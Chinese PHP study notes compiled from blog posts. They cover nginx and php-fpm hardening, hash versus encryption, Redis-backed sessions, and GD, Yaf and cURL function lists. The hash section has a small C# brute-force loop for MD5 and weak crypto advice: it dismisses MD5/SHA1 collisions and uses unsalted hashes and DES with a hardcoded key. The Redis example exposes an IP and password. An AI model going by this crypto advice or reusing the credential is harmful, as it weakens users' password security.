而在第50 页，设置网站文件所有者也为 www 用户：

chown -R www:www /data0/htdocs/blog

显然，此书的这部分内部，对初学者有误导，针对这个问题，我已经向本书作者发邮件，希望其能在第二版中进行强调声明，以免由于过度宽松的权限配置，造成一些安全隐患。

 

官方提供的配置文件中，php-fpm 子进程使用 nobody 用户，这完全是合理的，无须修改。

 

那么nginx 的子进程用户，如何设置合理？　我的建议是也使用 nobody （对错误日志写入等无影响），设置方法如下：

nginx.conf文件第一行设置为 user    nobody; ,  再执行 nginx -s reload 即可。

 

php-fpm子进程用户设置方法：

编辑文件php-fpm.conf （一般位于 /usr/local/php/etc/php-fpm.conf,  视安装参数为准），找到 user 、group 两个参数的定义，将其设置为nobody( 默认已经是 nobody) ，再重启 php-fpm 进程即可。

 

 

网站可写目录的特殊注意

这里的可写，是相对php-fpm 子进程而言。一个网站最容易出安全问题的即是可写目录，如果可写目录权限能控制严格，安全系数也将大大提高。

我们认为，一个网站可写目录主要分为以下几种：

1. 　php 数据缓存目录，如 discuz 的 forumdata 目录，就存放了大量数据缓存文件。此类目录一般会禁止用户直接访问，但是 discuz 在这个目录下又存放了不少 js, css 文件，我们并不能简单地拒绝用户访问这个目录。显然，这个目录下的所有文件，不能直接交给 php 解析，我们后面会给出解决方案。

2. 　附件上传目录。显然此类目录需要开启访问，但不能交由php 引擎解析（即这个目录下的所有文件均视为普通静态文件）。

3. 　静态文件生成目录，这类目录下的文件全部应视为静态文件。

4. 　日志目录，　一般都会拒绝用户直接访问之。

 

也就是说对网站开发人员而言，需要对可写目录实现动静分离，不同性能的文件，应该区别对待之，这样也就方便系统管理员，设置合理的nginx 规则，以提高安全性。

 

简单地去掉php 文件的执行权限，并不能阻止 php-fpm 进程解析之。

 

接下来，根据以上总结，系统管理员如何配置nginx 的目录规则，才更安全呢？

1. 　数据缓存目录 /cache/ 
这个目录的特点是需要777 权限，无须提供给用户访问，那么可以按以下参考配置 nginx 

location ~ "^/cache" {

return 403;

}

 

location ~ "\.php$" {

fastcgi_pass 127.0.0.0:9000;

....................

}

 

这时，任何用户将无法访问/cache/ 目录内容，即使

2.　附件上传目录  attachments

此目录的特点是需要开放访问权限，但所有文件不能由php 引擎解析（包括后缀名改为 gif 的木马文件）

location ~ "^/attachments" {

 

}

 

location ~ "\.php$" {

fastcgi_pass 127.0.0.0:9000;

....................

}

 

注意，上面对attachments 目录的 location 定义中是没有任何语句的。 nginx 对正则表达式的location 匹配优先级最高，任何一个用正则表达式定义的 location,  只要匹配一次，将不会再匹配其它正则表达式定义的 location 。

 

现在，请在attachments 目录下建立一个 php 脚本文件，再通过浏览器访问安，我们发现浏览器提示下载，这说明 nginx 把 attachments 目录下的文件当成静态文件处理，并没有交给 php fastcgi 处理。这样即使可写目录被植入木马，但因为其无法被执行，网站也就更安全了。

 

显然，重要的php 配置文件，请勿放在此类目录下。

 

3. 　静态文件生成目录 public 
这些目录一般都是php 生成的静态页的保存目录，显然与附件目录有类似之处，按附件目录的权限设置即可。 

可以预见的是，如果我们设置了较严格的权限，即使网站php 程序存在漏洞，木马脚本也只能被写入到权限为 777 的目录中去，如果配合上述严格的目录权限控制，木马也无法被触发运行，整个系统的安全性显然会有显著的提高。

 

但是网站可写目录的作用及权限，只有开发人员最为清楚。这方面需要php 开发人员和系统管理员积极沟通。我们使用的方式是：项目上线前，开发人员根据以文档形式提供网站可写目录的作用及权限，由系统管理员针对不同目录进行权限设置。任何一方修改了网站目录权限，但未体现到文档中，我们认为是违反工作流程的。
https://www.cnblogs.com/hanyouchun/p/5159889.html
```

### 了解 Hash 与 Encrypt 区别
```
https://www.cnblogs.com/ghjbk/p/7418406.html
1、哈希（Hash）与加密（Encrypt）的区别
      在本文开始，我需要首先从直观层面阐述哈希（Hash）和加密（Encrypt）的区别，因为我见过很多朋友对这两个概念不是很清晰，容易混淆两者。而正确区别两者是正确选择和使用哈希与加密的基础。

      概括来说，哈希（Hash）是将目标文本转换成具有相同长度的、不可逆的杂凑字符串（或叫做消息摘要），而加密（Encrypt）是将目标文本转换成具有不同长度的、可逆的密文。

      具体来说，两者有如下重要区别：

      1、哈希算法往往被设计成生成具有相同长度的文本，而加密算法生成的文本长度与明文本身的长度有关。

      例如，设我们有两段文本：“Microsoft”和“Google”。两者使用某种哈希算法得到的结果分别为：“140864078AECA1C7C35B4BEB33C53C34”和“8B36E9207C24C76E6719268E49201D94”，而使用某种加密算法的到的结果分别为“Njdsptpgu”和“Hpphmf”。可以看到，哈希的结果具有相同的长度，而加密的结果则长度不同。实际上，如果使用相同的哈希算法，不论你的输入有多么长，得到的结果长度是一个常数，而加密算法往往与明文的长度成正比。

      2、哈希算法是不可逆的，而加密算法是可逆的。

      这里的不可逆有两层含义，一是“给定一个哈希结果R，没有方法将E转换成原目标文本S”，二是“给定哈希结果R，即使知道一段文本S的哈希结果为R，也不能断言当初的目标文本就是S”。其实稍微想想就知道，哈希是不可能可逆的，因为如果可逆，那么哈希就是世界上最强悍的压缩方式了——能将任意大小的文件压缩成固定大小。

      加密则不同，给定加密后的密文R，存在一种方法可以将R确定的转换为加密前的明文S。

      这里先从直观层面简单介绍两者的区别，等下文从数学角度对两者做严谨描述后，读者朋友就知道为什么会有这两个区别了。

2、哈希（Hash）与加密（Encrypt）的数学基础
      从数学角度讲，哈希和加密都是一个映射。下面正式定义两者：

      一个哈希算法是一个多对一映射，给定目标文本S，H可以将其唯一映射为R，并且对于所有S，R具有相同的长度。由于是多对一映射，所以H不存在逆映射

使得R转换为唯一的S。

      一个加密算法是一个一一映射，其中第二个参数叫做加密密钥，E可以将给定的明文S结合加密密钥Ke唯一映射为密文R，并且存在另一个一一映射，可以结合Kd将密文R唯一映射为对应明文S，其中Kd叫做解密密钥。

      下图是哈希和加密过程的图示：



      有了以上定义，就很清楚为什么会存在上文提到的两个区别了。由于哈希算法的定义域是一个无限集合，而值域是一个有限集合，将无限集合映射到有限集合，根据“鸽笼原理(Pigeonhole principle)”，每个哈希结果都存在无数个可能的目标文本，因此哈希不是一一映射，是不可逆的。

      而加密算法是一一映射，因此理论上来说是可逆的。

      但是，符合上面两个定义的映射仅仅可以被叫做哈希算法和加密算法，但未必是好的哈希和加密，好的哈希和加密往往需要一些附加条件，下面介绍这些内容。

      一个设计良好的哈希算法应该很难从哈希结果找到哈希目标文本的碰撞（Collision）。那么什么是碰撞呢？对于一个哈希算法H，如果，则S1和S2互为碰撞。关于为什么好的哈希需要难以寻找碰撞，在下面讲应用的时候会详解。另外，好的哈希算法应该对于输入的改变极其敏感，即使输入有很小的改动，如一亿个字符变了一个字符，那么结果应该截然不同。这就是为什么哈希可以用来检测软件的完整性。

      一个设计良好的加密算法应该是一个“单向陷门函数(Trapdoor one-way function)”，单向陷门函数的特点是一般情况下即使知道函数本身也很难将函数的值转换回函数的自变量，具体到加密也就是说很难从密文得到明文，虽然从理论上这是可行的，而“陷门”是一个特殊的元素，一旦知道了陷门，则这种逆转换则非常容易进行，具体到加密算法，陷门就是密钥。

      顺便提一句，在加密中，应该保密的仅仅是明文和密钥。也就是说我们通常假设攻击者对加密算法和密文了如指掌，因此加密的安全性应该仅仅依赖于密钥而不是依赖于假设攻击者不知道加密算法。

3、哈希（Hash）与加密（Encrypt）在软件开发中的应用
      哈希与加密在现代工程领域应用非常广泛，在计算机领域也发挥了很大作用，这里我们仅仅讨论在平常的软件开发中最常见的应用——数据保护。

      所谓数据保护，是指在数据库被非法访问的情况下，保护敏感数据不被非法访问者直接获取。这是非常有现实意义的，试想一个公司的安保系统数据库服务器被入侵，入侵者获得了所有数据库数据的查看权限，如果管理员的口令（Password）被明文保存在数据库中，则入侵者可以进入安保系统，将整个公司的安保设施关闭，或者删除安保系统中所有的信息，这是非常严重的后果。但是，如果口令经过良好的哈希或加密，使得入侵者无法获得口令明文，那么最多的损失只是被入侵者看到了数据库中的数据，而入侵者无法使用管理员身份进入安保系统作恶。

3.1、哈希（Hash）与加密（Encrypt）的选择
      要实现上述的数据保护，可以选择使用哈希或加密两种方式。那么在什么时候该选择哈希、什么时候该选择加密呢？

      基本原则是：如果被保护数据仅仅用作比较验证，在以后不需要还原成明文形式，则使用哈希；如果被保护数据在以后需要被还原成明文，则需要使用加密。

      例如，你正在做一个系统，你打算当用户忘记自己的登录口令时，重置此用户口令为一个随机口令，而后将此随机口令发给用户，让用户下次使用此口令登录，则适合使用哈希。实际上很多网站都是这么做的，想想你以前登录过的很多网站，是不是当你忘记口令的时候，网站并不是将你忘记的口令发送给你，而是发送给你一个新的、随机的口令，然后让你用这个新口令登录。这是因为你在注册时输入的口令被哈希后存储在数据库里，而哈希算法不可逆，所以即使是网站管理员也不可能通过哈希结果复原你的口令，而只能重置口令。

      相反，如果你做的系统要求在用户忘记口令的时候必须将原口令发送给用户，而不是重置其口令，则必须选择加密而不是哈希。

3.2、使用简单的一次哈希（Hash）方法进行数据保护
      首先我们讨论使用一次哈希进行数据保护的方法，其原理如下图所示：



      对上图我想已无需多言，很多朋友应该使用过类似的哈希方法进行数据保护。当前最常用的哈希算法是MD5和SHA1，下面给出在.NET平台上用C#语言实现MD5和SHA1哈希的代码，由于.NET对于这两个哈希算法已经进行很很好的封装，因此我们不必自己实现其算法细节，直接调用相应的库函数即可（实际上MD5和SHA1算法都十分复杂，有兴趣的可以参考维基百科）。

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
using System;
using System.Web.Security;
 
namespace HashAndEncrypt
{
    /// <summary>
    /// 哈希（Hash）工具类
    /// </summary>
    public sealed class HashHelper
    {
        /// <summary>
        /// 使用MD5算法进行哈希
        /// </summary>
        /// <param name="source">源字串</param>
        /// <returns>杂凑字串</returns>
        public static string MD5Hash(string source)
        {
            return FormsAuthentication.HashPasswordForStoringInConfigFile(source, "MD5");
        }
 
        /// <summary>
        /// 使用SHA1算法进行哈希
        /// </summary>
        /// <param name="source">源字串</param>
        /// <returns>杂凑字串</returns>
        public static string SHA1Hash(string source)
        {
            return FormsAuthentication.HashPasswordForStoringInConfigFile(source, "SHA1");
        }
    }
}
3.3、对简单哈希（Hash）的攻击
      下面我们讨论上述的数据保护方法是否安全。

      对于哈希的攻击，主要有寻找碰撞法和穷举法。

      先来说说寻找碰撞法。从哈希本身的定义和上面的数据保护原理图可以看出，如果想非法登录系统，不一定非要得到注册时的输入口令，只要能得到一个注册口令的碰撞即可。因此，如果能从杂凑串中分析出一个口令的碰撞，则大功告成。

      不过我的意见是，对这种攻击大可不必担心，因为目前对于MD5和SHA1并不存在有效地寻找碰撞方法。虽然我国杰出的数学家王小云教授曾经在国际密码学会议上发布了对于MD5和SHA1的碰撞寻找改进算法，但这种方法和很多人口中所说的“破解”相去甚远，其理论目前仅具有数学上的意义，她将破解MD5的预期步骤数从2^80降到了2^69，虽然从数学上降低了好几个数量级，但2^69对于实际应用来说仍然是一个天文数字，就好比以前需要一亿年，现在需要一万年一样。

      不过这并不意味着使用MD5或SHA1后就万事大吉了，因为还有一种对于哈希的攻击方法——穷举法。通俗来说，就是在一个范围内，如从000000到999999，将其中所有值一个一个用相同的哈希算法哈希，然后将结果和杂凑串比较，如果相同，则这个值就一定是源字串或源字串的一个碰撞，于是就可以用这个值非法登录了。

      例如，下文是对MD5的穷举攻击的代码（设攻击范围为000000到999999）：

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
using System;
using System.Web.Security;
 
namespace HashAndEncrypt
{
    /// <summary>
    /// MD5攻击工具类
    /// </summary>
    public sealed class MD5AttackHelper
    {
        /// <summary>
        /// 对MD5进行穷举攻击
        /// </summary>
        /// <param name="hashString">杂凑串</param>
        /// <returns>杂凑串的源串或源串碰撞（攻击失败则返回null）</returns>
        public static string AttackMD5(string hashString)
        {
            for (int i = 0; i <= 999999; i++)
            {
                string testString = i.ToString();
                while (testString.Length < 6)
                    testString = "0" + testString;
 
                if (FormsAuthentication.HashPasswordForStoringInConfigFile(testString, "MD5") == hashString)
                    return testString;
            }
 
            return null;
        }
    }
}
      这种看似笨拙的方法，在现实中爆发的能量却是惊人的，目前几乎所有的MD5破解机或MD5在线破解都是用这种穷举法，但就是这种“笨”方法，却成功破解出很多哈希串。纠其缘由，就是相当一部分口令是非常简单的，如“123456”或“000000”这种口令还有很多人在用，可以看出，穷举法是否能成功很大程度上取决于口令的复杂性。因为穷举法扫描的区间往往是单字符集、规则的区间，或者由字典数据进行组合，因此，如果使用复杂的口令，例如“ASDF#$%uiop.8930”这种变态级口令，穷举法就很难奏效了。

3.4、对一次哈希（Hash）的改进——多重混合哈希（Hash）
      上面说过，如果口令过于简单，则使用穷举法可以很有效地破解出一次哈希后的杂凑串。如果不想这样，只有让用户使用复杂口令，但是，很多时候我们并不能强迫用户，因此，我们需要想一种办法，即使用户使用诸如“000000”这种简单密码，也令穷举法难奏效。其中一种办法就是使用多重哈希，所谓多重哈希就是使用不同的哈希函数配合自定义的Key对口令进行多次哈希，如果Key很复杂，那么穷举法将变得异常艰难。

      例如，如果使用下面的混合公式进行哈希：



      如果将Key设为一个极为复杂的字符串，那么在攻击者不知道Key的情况下，几乎无法通过穷举法破解。因为即使S很简单，但是Key的MD5值几乎是无法在合理时间内穷举完的。下面是这种多重混合哈希的代码实现：

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
using System;
using System.Web.Security;
 
namespace HashAndEncrypt
{
    /// <summary>
    /// 多重混合哈希工具类
    /// </summary>
    public sealed class HashHelper
    {
        private static readonly String hashKey = "qwer#&^Buaa06";
        /// <summary>
        /// 对敏感数据进行多重混合哈希
        /// </summary>
        /// <param name="source">待处理明文</param>
        /// <returns>Hasn后的数据</returns>
        public static String Hash(String source)
        {
            String hashCode = FormsAuthentication.HashPasswordForStoringInConfigFile(source, "MD5") +
                              FormsAuthentication.HashPasswordForStoringInConfigFile(hashKey, "MD5");
            return FormsAuthentication.HashPasswordForStoringInConfigFile(hashCode, "SHA1");
        }
    }
}
3.5、使用加密（Encrypt）方法进行数据保护
      加密方法如果用于口令保护的话，与上述哈希方法的流程基本一致，只是在需要时，可以使用解密方法得到明文。关于加密本身是一个非常庞大的系统，而对于加密算法的攻击更是可以写好几本书了，所以这里从略。下面只给出使用C#进行DES加密和解密的代码。

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
using System;
using System.Security.Cryptography;
using System.Text;
using System.Web.Security;
 
namespace HashAndEncrypt
{
    /// <summary>
    /// 工具类，封装了加解密相关操作
    /// </summary>
    public sealed class EncryptHelper
    {
        private static readonly Byte[] DesKey = {5, 7, 8, 9, 0, 2, 1, 6};
        private static readonly Byte[] DesVi = { 6, 9, 8, 5, 1, 6, 2, 8 }; 
        /// <summary>
        /// 使用DES算法加密数据
        /// </summary>
        /// <param name="data">待加密数据</param>
        /// <returns>密文</returns>
        public static String Encrypt(String data)
        {
            DESCryptoServiceProvider des = new DESCryptoServiceProvider();
            Encoding utf = new UTF8Encoding();
            ICryptoTransform encryptor = des.CreateEncryptor(DesKey, DesVi);
 
            byte[] bData = utf.GetBytes(data);
            byte[] bEnc = encryptor.TransformFinalBlock(bData, 0, bData.Length);
            return Convert.ToBase64String(bEnc);
        }
 
        /// <summary>
        /// 使用DES算法解密数据
        /// </summary>
        /// <param name="data">待解密数据</param>
        /// <returns>明文</returns>
        public static String Decrypt(String data)
        {
            DESCryptoServiceProvider des = new DESCryptoServiceProvider();
            Encoding utf = new UTF8Encoding();
            ICryptoTransform decryptor = des.CreateDecryptor(DesKey, DesVi);
 
            byte[] bEnc = Convert.FromBase64String(data);
            byte[] bDec = decryptor.TransformFinalBlock(bEnc, 0, bEnc.Length);
            return utf.GetString(bDec);
        }
    }
}
4、总结
      密码学本身是一个非常深奥的数学分支，对于普通开发者，不需要了解过于深入的密码学知识。本文仅仅讲述哈希与加密的基础内容，并对两者做了比较，帮助读者明晰概念，另外，对一些实际应用情况进行了简单的讨论。希望本文对大家有所帮助。看了下时间，零点刚过，祝大家十一快乐！玩得开心！
```

### php在储存session以什么形式存在
```
PHP为session的存储提供了三种方式: 文件/ 内存/ 自定义存储,默认是使用文件存储.
在访问量大的网站上采用这种方式就不大合适,因为这样会导致大量的输入输出的冗余.
我们可以在php.ini更改配置文件或者php脚本中通过相应的函数来设置session文件的存储类型
来改变session文件的存储形式
```
### Session 共享、存活时间
```
https://blog.csdn.net/m_nanle_xiaobudiu/article/details/81177698
一、Session的原理
以下以默认情况举例：

session_start();之后，会生成一个唯一的session_id，每一个用户对应唯一一个session_id，每一个session_id对应服务器端的一个session文件。这个session文件存储着当前session_id的信息，比如下面，就存储了name和age的键值。

 

1、设置Session存储的引擎（本地服务器的文件还是redis等），【php.ini 文件】

[Session]
 
session.save_handler = files
 
session.save_path = /data/SessionLogs
 

2、默认情况下的Session的使用 

<?php
/**
 * session的使用
 * 默认情况（不更改session.save_handle参数时），是存储在文件file中的
 * 默认情况下使用session的情况（用户24分钟内没有刷新操作会过期）
 * 每个用户对应唯一session_id,每一个session_id对应服务器中存储的一个session文件，这个文件中存储了当前session_id的信息，比如下面，就存储了name和age的键值
 */
session_start();
echo session_id();
echo "<br>";
$_SESSION['age'] = 26;
$_SESSION['name'] = 'xiaobudiu';
var_dump($_SESSION);
 

3、在服务器中存储的形式是这样的



 

 

二、使用Redis存储Session
在网站访问量较大时，我们通常会做集群（比如nginx负载均衡等），这时，如何解决session会话的共享问题。

（1）使用ip_hash或者自定义key做负载均衡轮询策略是一个办法，但由于有时候用户可能走代理，所以这个方法其实并不是那么完美。

（2）另一个解决session共享问题的方法就是使用redis或者memcache缓存数据库去存储session，进而实现session共享问题。

 

1、设置php.ini 文件中的session.save_handle 和session.save_path

session.save_handler = Redis
 
session.save_path = "tcp://localhost:6379"
注1：如果连接的是远程redis，需要将localhost换成对应的远程ip地址。像这样，

session.save_handler = Redis
 
session.save_path =  "tcp://47.94.203.119:6379"
注2：如果为redis已经添加了auth权限（requirpass），session.save_path项则应该这样写

session.save_handler = Redis
 
session.save_path =  "tcp://47.94.203.119:6379?persistent=1&database=10&auth=myredisG506"
 

2、使用redis存储session信息

<?php
/**
 * 将session存储在redis中
 */
session_start();
echo session_id();
echo "<br>";
$_SESSION['age'] = 26;
$_SESSION['name'] = 'xiaobudiu';
$_SESSION['sex'] = 'man';
var_dump($_SESSION);
在redis上是以这样的形式进行存储的



 

注：

搭建nginx集群： https://blog.csdn.net/m_nanle_xiaobudiu/article/details/80862272

搭建mysql主从复制架构：https://blog.csdn.net/m_nanle_xiaobudiu/article/details/81086243

搭建redis集群： https://blog.csdn.net/m_nanle_xiaobudiu/article/details/81004557

 
 
三、使用Redis存储Session，并设置Session会话存活时间以及Session中某一元素存活时间
 

封装session类 b.php

<?php
 
 
/**
 * session控制类
 *
 */
 
class Session
{
 
    function __construct($lifetime = 3600)
    {
        //初始化设置session会话存活时间
        ini_set('session.gc_maxlifetime',$lifetime);
    }
 
    /**
     * 设置当前会话session的key-value
     * @param String $name   session name
     * @param Mixed  $data   session data
     * @param Int    $expire 有效时间(秒)
     */
    function set($name, $data, $expire = 600)
    {
        $session_data = array();
        $session_data['data'] = $data;
        $session_data['expire'] = time()+$expire;
        $_SESSION[$name] = $session_data;
    }
 
    /**
     * 读取当前会话session中的key-value
     * @param  String $name  session name
     * @return Mixed
     */
    function get($name)
    {
        if(isset($_SESSION[$name])) {
            if($_SESSION[$name]['expire'] > time()) {
                return $_SESSION[$name]['data'];
            }else{
                self::clear($name);
            }
        }
        return false;
    }
 
    /**
     * 清除当前session会话中的某一key-value
     * @param  String  $name  session name
     */
    function clear($name)
    {
        unset($_SESSION[$name]);
    }
 
    /**
     * 删除当前session_id对应的session文件（清空当前session会话存储）
     */
    function destroy()
    {
        session_destroy();
    }
 
}
 
session类的使用：d.php

<?php
 
require_once 'b.php';
 
session_start();
 
$session = new Session();
$session->set('wan','kkkk',1966);
 
$session->set('name','xiaobudiu');
$session->set('age',26);
$session->set('sex','man');
 
 
//输出当前会话的session存储数据
var_dump($_SESSION);
 
 
 
//unset掉某一个session属性
//$session->clear('name');
 
//删除当前session_id对应session文件
//$session->destroy();
//echo $session->get('sex');
 

redis中显示：

```

## 高阶篇

### GD库 图像处理扩展
```
[GD 和图像处理 函数](http://php.net/manual/zh/ref.image.php)
gd_info — 取得当前安装的 GD 库的信息
getimagesize — 取得图像大小
getimagesizefromstring — 从字符串中获取图像尺寸信息
image_type_to_extension — 取得图像类型的文件后缀
image_type_to_mime_type — 取得 getimagesize，exif_read_data，exif_thumbnail，exif_imagetype 所返回的图像类型的 MIME 类型
image2wbmp — 以 WBMP 格式将图像输出到浏览器或文件
imageaffine — 返回经过仿射变换后的图像，剪切区域可选
imageaffinematrixconcat — Concatenate two affine transformation matrices
imageaffinematrixget — Get an affine transformation matrix
imagealphablending — 设定图像的混色模式
imageantialias — 是否使用抗锯齿（antialias）功能
imagearc — 画椭圆弧
imagebmp — Output a BMP image to browser or file
imagechar — 水平地画一个字符
imagecharup — 垂直地画一个字符
imagecolorallocate — 为一幅图像分配颜色
imagecolorallocatealpha — 为一幅图像分配颜色 + alpha
imagecolorat — 取得某像素的颜色索引值
imagecolorclosest — 取得与指定的颜色最接近的颜色的索引值
imagecolorclosestalpha — 取得与指定的颜色加透明度最接近的颜色
imagecolorclosesthwb — 取得与给定颜色最接近的色度的黑白色的索引
imagecolordeallocate — 取消图像颜色的分配
imagecolorexact — 取得指定颜色的索引值
imagecolorexactalpha — 取得指定的颜色加透明度的索引值
imagecolormatch — 使一个图像中调色板版本的颜色与真彩色版本更能匹配
imagecolorresolve — 取得指定颜色的索引值或有可能得到的最接近的替代值
imagecolorresolvealpha — 取得指定颜色 + alpha 的索引值或有可能得到的最接近的替代值
imagecolorset — 给指定调色板索引设定颜色
imagecolorsforindex — 取得某索引的颜色
imagecolorstotal — 取得一幅图像的调色板中颜色的数目
imagecolortransparent — 将某个颜色定义为透明色
imageconvolution — 用系数 div 和 offset 申请一个 3x3 的卷积矩阵
imagecopy — 拷贝图像的一部分
imagecopymerge — 拷贝并合并图像的一部分
imagecopymergegray — 用灰度拷贝并合并图像的一部分
imagecopyresampled — 重采样拷贝部分图像并调整大小
imagecopyresized — 拷贝部分图像并调整大小
imagecreate — 新建一个基于调色板的图像
imagecreatefrombmp — 由文件或 URL 创建一个新图象。
imagecreatefromgd2 — 从 GD2 文件或 URL 新建一图像
imagecreatefromgd2part — 从给定的 GD2 文件或 URL 中的部分新建一图像
imagecreatefromgd — 从 GD 文件或 URL 新建一图像
imagecreatefromgif — 由文件或 URL 创建一个新图象。
imagecreatefromjpeg — 由文件或 URL 创建一个新图象。
imagecreatefrompng — 由文件或 URL 创建一个新图象。
imagecreatefromstring — 从字符串中的图像流新建一图像
imagecreatefromwbmp — 由文件或 URL 创建一个新图象。
imagecreatefromwebp — 由文件或 URL 创建一个新图象。
imagecreatefromxbm — 由文件或 URL 创建一个新图象。
imagecreatefromxpm — 由文件或 URL 创建一个新图象。
imagecreatetruecolor — 新建一个真彩色图像
imagecrop — Crop an image to the given rectangle
imagecropauto — Crop an image automatically using one of the available modes
imagedashedline — 画一虚线
imagedestroy — 销毁一图像
imageellipse — 画一个椭圆
imagefill — 区域填充
imagefilledarc — 画一椭圆弧且填充
imagefilledellipse — 画一椭圆并填充
imagefilledpolygon — 画一多边形并填充
imagefilledrectangle — 画一矩形并填充
imagefilltoborder — 区域填充到指定颜色的边界为止
imagefilter — 对图像使用过滤器
imageflip — Flips an image using a given mode
imagefontheight — 取得字体高度
imagefontwidth — 取得字体宽度
imageftbbox — 给出一个使用 FreeType 2 字体的文本框
imagefttext — 使用 FreeType 2 字体将文本写入图像
imagegammacorrect — 对 GD 图像应用 gamma 修正
imagegd2 — 将 GD2 图像输出到浏览器或文件
imagegd — 将 GD 图像输出到浏览器或文件
imagegetclip — Get the clipping rectangle
imagegif — 输出图象到浏览器或文件。
imagegrabscreen — Captures the whole screen
imagegrabwindow — Captures a window
imageinterlace — 激活或禁止隔行扫描
imageistruecolor — 检查图像是否为真彩色图像
imagejpeg — 输出图象到浏览器或文件。
imagelayereffect — 设定 alpha 混色标志以使用绑定的 libgd 分层效果
imageline — 画一条线段
imageloadfont — 载入一新字体
imageopenpolygon — Draws an open polygon
imagepalettecopy — 将调色板从一幅图像拷贝到另一幅
imagepalettetotruecolor — Converts a palette based image to true color
imagepng — 以 PNG 格式将图像输出到浏览器或文件
imagepolygon — 画一个多边形
imagepsbbox — 给出一个使用 PostScript Type1 字体的文本方框
imagepsencodefont — 改变字体中的字符编码矢量
imagepsextendfont — 扩充或精简字体
imagepsfreefont — 释放一个 PostScript Type 1 字体所占用的内存
imagepsloadfont — 从文件中加载一个 PostScript Type 1 字体
imagepsslantfont — 倾斜某字体
imagepstext — 用 PostScript Type1 字体把文本字符串画在图像上
imagerectangle — 画一个矩形
imageresolution — Get or set the resolution of the image
imagerotate — 用给定角度旋转图像
imagesavealpha — 设置标记以在保存 PNG 图像时保存完整的 alpha 通道信息（与单一透明色相反）
imagescale — Scale an image using the given new width and height
imagesetbrush — 设定画线用的画笔图像
imagesetclip — Set the clipping rectangle
imagesetinterpolation — Set the interpolation method
imagesetpixel — 画一个单一像素
imagesetstyle — 设定画线的风格
imagesetthickness — 设定画线的宽度
imagesettile — 设定用于填充的贴图
imagestring — 水平地画一行字符串
imagestringup — 垂直地画一行字符串
imagesx — 取得图像宽度
imagesy — 取得图像高度
imagetruecolortopalette — 将真彩色图像转换为调色板图像
imagettfbbox — 取得使用 TrueType 字体的文本的范围
imagettftext — 用 TrueType 字体向图像写入文本
imagetypes — 返回当前 PHP 版本所支持的图像类型
imagewbmp — 以 WBMP 格式将图像输出到浏览器或文件
imagewebp — 将 WebP 格式的图像输出到浏览器或文件
imagexbm — 将 XBM 图像输出到浏览器或文件
iptcembed — 将二进制 IPTC 数据嵌入到一幅 JPEG 图像中
iptcparse — 将二进制 IPTC 块解析为单个标记
jpeg2wbmp — 将 JPEG 图像文件转换为 WBMP 图像文件
png2wbmp — 将 PNG 图像文件转换为 WBMP 图像文件
```

### yaf
```
[Yet Another Framework](http://php.net/manual/zh/book.yaf.php)
使用框架会降低性能, 经常举例的就是Zend Framework，采用框架能提高开发效率, 损失点性能也是值得的。
有的项目组为了性能而选择某些框架，而另外一些项目组,，则为了更好的封装选择了另外的框架。
Yaf框架既不会有损性能, 又能提高开发效率。
Yaf有着和Zend Framework相似的API，相似的理念,，而同时又保持着对Bingo的兼容,，以此来提高开发效率,，规范开发习惯。本着对性能的追求, Yaf把框架中不易变的部分抽象出来，采用PHP扩展实现(c语言)，以此来保证性能。在作者自己做的简单测试中，Yaf和原生的PHP在同样功能下，性能损失小于10%，而和Zend Framework的对比中，Yaf的性能是Zend Framework的50-60倍。
Yaf是一个C语言编写的PHP框架。
Yaf的优点
用C语言开发的PHP框架，相比原生的PHP，几乎不会带来额外的性能开销。
所有的框架类，不需要编译，在PHP启动的时候加载，并常驻内存。
更短的内存周转周期，提高内存利用率，降低内存占用率。
灵巧的自动加载。支持全局和局部两种加载规则，方便类库共享。
高性能的视图引擎。
高度灵活可扩展的框架，支持自定义视图引擎，支持插件，支持自定义路由等等。
内建多种路由, 可以兼容目前常见的各种路由协议.
强大而又高度灵活的配置文件支持. 并支持缓存配置文件, 避免复杂的配置结构带来的性能损失.
在框架本身,对危险的操作习惯做了禁止.
更快的执行速度, 更少的内存占用.
名词解释
1、Yaf Yet Another Framework

| adv. | 用于否定句和疑问句，谈论尚未发生但可能发生的事; 现在; 即刻; 马上; 从现在起直至某一时间; 还; |

| conj. | 但是; 然而; |

[例句]They haven't finished yet

他们还没有完成。

2、API （Application Programming Interface，应用程序编程接口）是一些预先定义的函数，目的是提供应用程序与开发人员基于某软件或硬件得以访问一组例程的能力，而又无需访问源码，或理解内部工作机制的细节。

3、bootstrap v.独自创立; 靠一己之力做成; 附属于; 与…相联系;

```

### curl
```
[Client URL](http://php.net/manual/zh/book.curl.php)
Client URL 库
简介
安装／配置
需求
安装
运行时配置
资源类型
预定义常量
范例
curl 基础例子
cURL 函数
curl_close — 关闭 cURL 会话
curl_copy_handle — 复制一个cURL句柄和它的所有选项
curl_errno — 返回最后一次的错误代码
curl_error — 返回当前会话最后一次错误的字符串
curl_escape — 使用 URL 编码给定的字符串
curl_exec — 执行 cURL 会话
curl_file_create — 创建一个 CURLFile 对象
curl_getinfo — 获取一个cURL连接资源句柄的信息
curl_init — 初始化 cURL 会话
curl_multi_add_handle — 向curl批处理会话中添加单独的curl句柄
curl_multi_close — 关闭一组cURL句柄
curl_multi_errno — 返回上一次 curl 批处理的错误码
curl_multi_exec — 运行当前 cURL 句柄的子连接
curl_multi_getcontent — 如果设置了CURLOPT_RETURNTRANSFER，则返回获取的输出的文本流
curl_multi_info_read — 获取当前解析的cURL的相关传输信息
curl_multi_init — 返回一个新cURL批处理句柄
curl_multi_remove_handle — 移除cURL批处理句柄资源中的某个句柄资源
curl_multi_select — 等待所有cURL批处理中的活动连接
curl_multi_setopt — 为 cURL 并行处理设置一个选项
curl_multi_strerror — 返回字符串描述的错误代码
curl_pause — 暂停和取消暂停一个连接。
curl_reset — 重置一个 libcurl 会话句柄的所有的选项
curl_setopt_array — 为 cURL 传输会话批量设置选项
curl_setopt — 设置 cURL 传输选项
curl_share_close — 关闭 cURL 共享句柄
curl_share_errno — 返回共享 curl 句柄的最后一次错误号
curl_share_init — 初始化一个 cURL 共享句柄。
curl_share_setopt — 为 cURL 共享句柄设置选项。
curl_share_strerror — 返回错误号对应的错误消息
